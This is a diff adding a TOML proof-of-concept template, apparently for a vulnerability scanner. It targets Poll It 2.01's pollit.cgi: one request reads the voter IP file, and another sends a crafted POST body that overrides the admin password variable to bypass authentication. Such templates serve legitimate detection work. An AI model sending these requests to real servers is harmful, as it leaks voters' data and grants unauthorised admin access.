@@ -1,0 +1,52 @@
+[info]
+author = "AVE"
+description = "检测 Poll It 2.01及更早版本中 pollit.cgi 的数据文件信息泄露和管理员认证绕过漏洞。通过直接访问 pollit_files/ips.txt 获取投票者IP等敏感信息，或通过 CGI 变量覆盖绕过管理员密码验证。"
+id = "POC-AVE-2000-1073"
+name = "Poll It pollit.cgi 信息泄露与认证绕过 PoC"
+severity = "medium"
+tags = [
+    "cve-2000-1070",
+    "poll-it",
+    "cgi",
+    "information-disclosure",
+]
+vuln_id = [
+    "CVE-2000-1070",
+    "AVE-2000-1073",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/pollit_files/ips.txt"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["."]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/pollit.cgi"
+protocol = "http"
+
+[poc.requests.body]
+content = "load=admin&entered_password=foo&admin_password=foo"
+type = "raw"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "admin",
+    "password",
+    "option",
+]
